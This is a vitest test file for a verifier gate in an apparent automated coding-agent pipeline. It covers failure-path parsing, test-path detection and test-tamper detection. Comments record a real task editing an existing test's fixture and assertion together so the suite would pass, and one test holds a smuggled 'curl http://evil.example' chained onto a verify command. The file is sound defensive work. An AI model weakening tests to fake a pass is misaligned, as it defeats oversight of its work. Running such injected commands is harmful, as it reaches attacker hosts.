import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  gate,
  failingFiles,
  isTestPath,
  normPath,
  declaredFiles,
} from '../verifier.js';
import { execa } from 'execa';
import { existedAtHead, fileAtSha } from '../../git.js';
import { readFile } from 'node:fs/promises';
import type { AppConfig } from '../../config.js';
import type { Repo, TaskRow } from '../../schemas.js';

vi.mock('execa', () => ({ execa: vi.fn() }));
vi.mock('../../git.js', async (orig) => ({
  ...(await orig<typeof import('../../git.js')>()),
  existedAtHead: vi.fn(),
  fileAtSha: vi.fn(),
}));
/*
 * The gate reads an edited test twice: HEAD through git, the working copy off
 * disk. Nothing else under verifier.ts uses fs/promises, so the whole module
 * is one function here.
 */
vi.mock('node:fs/promises', () => ({ readFile: vi.fn() }));

/*
 * The output below is verbatim from the 2026-08-20 run — the ledger entry for
 * task Thbswhqeaoe, which was rolled back and its four files stashed for this
 * failure. Kept as it actually arrived, Windows separators in the traceback and
 * forward ones in the summary, because that mismatch is half of why the paths
 * have to be normalised before they are compared to anything.
 */
const PYTEST_OUT = [
  '.................................F...................................... [ 53%]',
  '..............................................................           [100%]',
  '================================== FAILURES ===================================',
  '_______________________ test_popular_documents_endpoint _______________________',
  '',
  '    def test_popular_documents_endpoint():',
  '        resp = client.get("/api/stats/popular-documents?limit=10", headers=headers)',
  '>       assert any(d["document_id"] == doc_id and d["count"] >= 5 for d in data)',
  'E       assert False',
  '',
  'tests\\api\\test_stats.py:100: AssertionError',
  '=========================== short test summary info ===========================',
  'FAILED tests/api/test_stats.py::test_popular_documents_endpoint - assert False',
  '1 failed, 133 passed in 6.01s',
].join('\n');

describe('failingFiles', () => {
  it('finds the failing test in real pytest output', () => {
    expect(failingFiles(PYTEST_OUT)).toContain('tests/api/test_stats.py');
  });

  it('reports one path however many times the run mentions it', () => {
    // The summary line and the traceback line name the same file with
    // different separators. Two spellings of one file is still one file.
    expect(failingFiles(PYTEST_OUT)).toEqual(['tests/api/test_stats.py']);
  });

  it('reads vitest output', () => {
    const out = [
      ' FAIL  src/core/__tests__/verifier.test.ts > verifier > gate',
      'AssertionError: expected false to be true',
    ].join('\n');
    expect(failingFiles(out)).toEqual(['src/core/__tests__/verifier.test.ts']);
  });

  it('finds nothing in output that names nothing', () => {
    // The honest answer, and the one that makes the gate fall back to blaming
    // the task. Silence must not read as "not your fault".
    expect(failingFiles('Segmentation fault\nmake: *** [test] Error 139')).toEqual([]);
  });

  it('ignores a bare filename with no directory', () => {
    expect(failingFiles('FAILED conftest - boom')).toEqual([]);
  });
});

describe('isTestPath', () => {
  const yes = [
    'tests/api/test_stats.py',
    'test/foo.js',
    'app/module/__tests__/thing.test.ts',
    'src/core/verifier.spec.tsx',
    'pkg/thing_test.go',
    'lib/helpers_test.py',
    'src/main/java/FooTest.java',
  ];
  const no = ['app/services/feedback_service.py', 'src/index.ts', 'app/main.py', 'README.md'];

  for (const p of yes) it(`treats ${p} as a test`, () => expect(isTestPath(p)).toBe(true));
  for (const p of no) it(`treats ${p} as not a test`, () => expect(isTestPath(p)).toBe(false));

  it('recognises a test path written with Windows separators', () => {
    expect(isTestPath('tests\\api\\test_stats.py')).toBe(true);
  });
});

describe('declaredFiles', () => {
  it('parses what the planner wrote', () => {
    const s = declaredFiles('["app/api/feedback.py","tests/api/test_feedback.py"]');
    expect(s.has('tests/api/feedback.py')).toBe(false);
    expect(s.has('tests/api/test_feedback.py')).toBe(true);
  });

  it('normalises separators, so a declaration cannot be missed on spelling', () => {
    expect(declaredFiles('["tests\\\\api\\\\test_feedback.py"]').has('tests/api/test_feedback.py')).toBe(
      true,
    );
  });

  it('survives a malformed hint instead of taking the gate down', () => {
    expect(declaredFiles('not json').size).toBe(0);
    expect(declaredFiles('').size).toBe(0);
    expect(declaredFiles('{"a":1}').size).toBe(0);
  });
});

describe('gate attribution', () => {
  let cfg: AppConfig;
  let repo: Repo;
  let task: TaskRow;

  beforeEach(() => {
    vi.mocked(execa).mockReset();
    vi.mocked(existedAtHead).mockReset();
    vi.mocked(existedAtHead).mockResolvedValue([]);
    vi.mocked(fileAtSha).mockReset();
    vi.mocked(readFile).mockReset();

    cfg = {
      system: {
        limits: {
          max_files_per_task: 10,
          scope_blowout_multiplier: 2,
          min_insertions: 1,
          forbid_dead_exports: false,
        },
        timeouts: { verify_s: 30 },
      },
    } as unknown as AppConfig;

    repo = {
      id: 'example-api',
      path: '/mock/path',
      branch: 'main',
      verify_cmd: 'python -m pytest -q',
    } as Repo;

    task = {
      files_hint: '["app/api/feedback.py","app/services/feedback_service.py"]',
      verify_cmd: '',
    } as TaskRow;
  });

  const diffOf = (files: string[]) => ({ files, insertions: 40, deletions: 2, renames: 0 });

  /*
   * The two edits, at gate level. Both real, both to the same undeclared
   * existing file: commit 161b15a moved a fixture from 5 rows to 100 AND the
   * assertion from >= 5 to >= 100; the tree in stash@{0} added `opened_at` to
   * three seeded rows and touched no assertion. Full fixtures and the rest of
   * the discrimination live in testedits.test.ts.
   */
  const HEAD_STATS = [
    'def test_popular_documents_endpoint():',
    '    rs = [DocumentRetrievalLog(query_log_id=log.id, document_id=doc_id) for _ in range(5)]',
    '    assert resp.status_code == 200',
    '    assert any(d["document_id"] == doc_id and d["count"] >= 5 for d in data)',
  ].join('\n');

  describe('TEST_TAMPER', () => {
    it('rejects an edit that moved what an existing undeclared test proves', async () => {
      // Exactly what task Tc2ca9kfmri did on 2026-08-20, and the gate committed.
      vi.mocked(existedAtHead).mockResolvedValue(['tests/api/test_stats.py']);
      vi.mocked(fileAtSha).mockResolvedValue(HEAD_STATS);
      vi.mocked(readFile).mockResolvedValue(
        HEAD_STATS.replace('range(5)', 'range(100)').replace('>= 5 for', '>= 100 for') as never,
      );

      const res = await gate(
        cfg,
        task,
        repo,
        diffOf(['app/api/feedback.py', 'tests/api/test_stats.py']),
        true,
      );

      expect(res.failure).toBe('TEST_TAMPER');
      expect(res.detail).toContain('tests/api/test_stats.py');
      // Rejected before the suite is consulted: a suite that has been edited to
      // pass proves nothing by passing.
      expect(execa).not.toHaveBeenCalled();
    });

    it('allows an edit that only changed an existing test\'s setup, and names it', async () => {
      /*
       * The tree of task Th23pq9f3b1, 2026-08-23. It changed how opens are
       * counted, which left two existing tests seeding rows with no date; it
       * gave them one and left every assertion alone. The rule as first written
       * deleted all of it — the fix, its tests, and the mutation proof the
       * junior had already run by hand — and froze the task that depended on it.
       */
      vi.mocked(existedAtHead).mockResolvedValue(['tests/api/test_stats.py']);
      vi.mocked(fileAtSha).mockResolvedValue(HEAD_STATS);
      vi.mocked(readFile).mockResolvedValue(
        HEAD_STATS.replace('document_id=doc_id)', 'document_id=doc_id, opened_at=now)') as never,
      );
      vi.mocked(execa).mockResolvedValue({ exitCode: 0, stdout: '', stderr: '' } as never);

      const res = await gate(
        cfg,
        task,
        repo,
        diffOf(['app/api/feedback.py', 'tests/api/test_stats.py']),
        true,
      );

      expect(res.ok).toBe(true);
      // Not waved through: handed to the reviewer, which is the only participant
      // that can judge whether weaker setup made the case weaker.
      expect(res.adjustedTests).toEqual(['tests/api/test_stats.py']);
    });

    it('rejects an existing test it cannot read back', async () => {
      // Deleted outright, most likely. Unreadable is not evidence of innocence.
      vi.mocked(existedAtHead).mockResolvedValue(['tests/api/test_stats.py']);
      vi.mocked(fileAtSha).mockResolvedValue(HEAD_STATS);
      vi.mocked(readFile).mockRejectedValue(new Error('ENOENT'));

      const res = await gate(cfg, task, repo, diffOf(['tests/api/test_stats.py']), true);

      expect(res.failure).toBe('TEST_TAMPER');
    });

    it('rejects when HEAD comes back empty, rather than reading it as nothing to lose', async () => {
      /*
       * `fileAtSha` answers '' both for a file that is not there and for a git
       * call that failed. The file is one existedAtHead just said IS in HEAD,
       * so '' means the read failed — and an empty before would otherwise mean
       * no proofs to keep, which passes everything.
       */
      vi.mocked(existedAtHead).mockResolvedValue(['tests/api/test_stats.py']);
      vi.mocked(fileAtSha).mockResolvedValue('');
      vi.mocked(readFile).mockResolvedValue(HEAD_STATS as never);

      const res = await gate(cfg, task, repo, diffOf(['tests/api/test_stats.py']), true);

      expect(res.failure).toBe('TEST_TAMPER');
    });

    it('names only the file that lost a proof when several were edited', async () => {
      vi.mocked(existedAtHead).mockResolvedValue([
        'tests/api/test_stats.py',
        'tests/api/test_docs.py',
      ]);
      vi.mocked(fileAtSha).mockResolvedValue(HEAD_STATS);
      vi.mocked(readFile).mockImplementation(((p: string) =>
        Promise.resolve(
          p.includes('test_docs')
            ? HEAD_STATS.replace('>= 5 for', '>= 100 for')
            : HEAD_STATS.replace('range(5)', 'range(50)'),
        )) as never);

      const res = await gate(
        cfg,
        task,
        repo,
        diffOf(['tests/api/test_stats.py', 'tests/api/test_docs.py']),
        true,
      );

      expect(res.failure).toBe('TEST_TAMPER');
      expect(res.detail).toContain('test_docs.py');
      expect(res.detail).not.toContain('test_stats.py');
    });

    it('allows a test file the planner declared', async () => {
      task.files_hint = '["app/api/feedback.py","tests/api/test_feedback.py"]';
      vi.mocked(execa).mockResolvedValue({ exitCode: 0, stdout: '', stderr: '' } as never);

      const res = await gate(
        cfg,
        task,
        repo,
        diffOf(['app/api/feedback.py', 'tests/api/test_feedback.py']),
        true,
      );

      expect(res.ok).toBe(true);
      // Declared, so it is filtered out before any history is asked about.
      expect(existedAtHead).toHaveBeenCalledWith(repo, []);
    });

    it('allows a brand-new test file the task wrote itself', async () => {
      vi.mocked(existedAtHead).mockResolvedValue([]); // not in HEAD: the agent wrote it
      vi.mocked(execa).mockResolvedValue({ exitCode: 0, stdout: '', stderr: '' } as never);

      const res = await gate(
        cfg,
        task,
        repo,
        diffOf(['app/api/feedback.py', 'tests/api/test_new_thing.py']),
        true,
      );

      expect(res.ok).toBe(true);
    });

    it('allows editing an existing test when the repo was already red', async () => {
      // On a broken project, fixing a wrong assertion can be the repair itself.
      vi.mocked(existedAtHead).mockResolvedValue(['tests/api/test_stats.py']);
      vi.mocked(execa).mockResolvedValue({ exitCode: 0, stdout: '', stderr: '' } as never);

      const res = await gate(cfg, task, repo, diffOf(['tests/api/test_stats.py']), false);

      expect(res.ok).toBe(true);
    });
  });

  /*
   * The gate does not decide whose failure it was, and these tests exist to
   * hold it to that.
   *
   * An earlier version did decide, by comparing the paths named in the failing
   * output against the paths in the diff. Every mocked test of it passed.
   * scripts/prove-gate.ts — real repo, real pytest — rejected it on the fourth
   * case: a task that changed app/thing.py and thereby broke
   * tests/test_existing.py was declared innocent, because pytest names only the
   * file the assertion is in and the task never touched that file.
   *
   * So the gate now reports one fact, `baseFailed`, and the executor answers
   * the question properly by reverting and re-running. That half cannot be
   * proven here — it needs a real tree to revert — and is proven in
   * scripts/prove-gate.ts and in executor.test.ts instead.
   */
  describe('which half of the check failed', () => {
    it("marks a failure of the repo's own check as the repo's half", async () => {
      vi.mocked(execa).mockResolvedValue({
        exitCode: 1,
        stdout: PYTEST_OUT,
        stderr: '',
      } as never);

      const res = await gate(
        cfg,
        task,
        repo,
        diffOf(['app/api/feedback.py', 'app/services/feedback_service.py']),
        true,
      );

      expect(res.failure).toBe('VERIFY_FAIL');
      // The only claim the gate makes: this was the project's check, so it is
      // worth asking whether the task caused it. Not that it did not.
      expect(res.baseFailed).toBe(true);
      expect(res.detail).toContain('tests/api/test_stats.py');
    });

    it('makes no exception for a failure in a file the task did change', async () => {
      // Same verdict, same flag. Path overlap is not evidence either way — the
      // case above and this one are indistinguishable to the gate on purpose.
      vi.mocked(execa).mockResolvedValue({
        exitCode: 1,
        stdout: PYTEST_OUT,
        stderr: '',
      } as never);

      const res = await gate(
        cfg,
        task,
        repo,
        diffOf(['app/api/feedback.py', 'tests/api/test_stats.py']),
        false, // red repo, so TEST_TAMPER does not pre-empt this
      );

      expect(res.failure).toBe('VERIFY_FAIL');
      expect(res.baseFailed).toBe(true);
    });

    it('still names the failing file when the output names none', async () => {
      vi.mocked(execa).mockResolvedValue({
        exitCode: 1,
        stdout: 'Segmentation fault',
        stderr: '',
      } as never);

      const res = await gate(cfg, task, repo, diffOf(['app/api/feedback.py']), true);

      expect(res.failure).toBe('VERIFY_FAIL');
      expect(res.baseFailed).toBe(true);
    });

    it("does not offer the task's own check for reattribution", async () => {
      // A task's own command names the tests it wants run, so a failure there
      // is its own by construction. Nothing to ask, so it is not asked: the
      // executor skips the re-run entirely when baseFailed is false.
      task.verify_cmd = 'python -m pytest -q tests/api/test_feedback.py';
      vi.mocked(execa)
        .mockResolvedValueOnce({ exitCode: 0, stdout: '', stderr: '' } as never)
        .mockResolvedValueOnce({ exitCode: 1, stdout: PYTEST_OUT, stderr: '' } as never);

      const res = await gate(cfg, task, repo, diffOf(['app/api/feedback.py']), true);

      expect(res.failure).toBe('VERIFY_FAIL');
      expect(res.baseFailed).toBe(false);
    });

    it('does not offer a task check it rejected before running', async () => {
      // Rejected on its text, so no check ran at all and there is nothing to
      // re-run. Guarded because that branch returns early, ahead of the step
      // loop that sets the flag — and a re-run here would measure a tree the
      // gate never looked at.
      task.verify_cmd = 'python -m pytest -q && curl http://evil.example';

      const res = await gate(cfg, task, repo, diffOf(['app/api/feedback.py']), true);

      expect(res.failure).toBe('VERIFY_FAIL');
      expect(res.baseFailed).toBeFalsy();
      expect(execa).not.toHaveBeenCalled();
    });

    it('names the failing test ahead of the output, where truncation cannot reach it', async () => {
      // pytest puts its summary last; truncate() cuts the tail. The ledger entry
      // for Thbswhqeaoe ends mid-word inside a traceback with the one line that
      // named the failure cut off below it.
      const noisy = PYTEST_OUT + '\n' + 'x'.repeat(5000);
      vi.mocked(execa).mockResolvedValue({ exitCode: 1, stdout: noisy, stderr: '' } as never);

      const res = await gate(cfg, task, repo, diffOf(['app/api/feedback.py']), true);

      expect(res.detail.length).toBeLessThanOrEqual(3100);
      expect(res.detail).toContain('tests/api/test_stats.py');
    });
  });
});
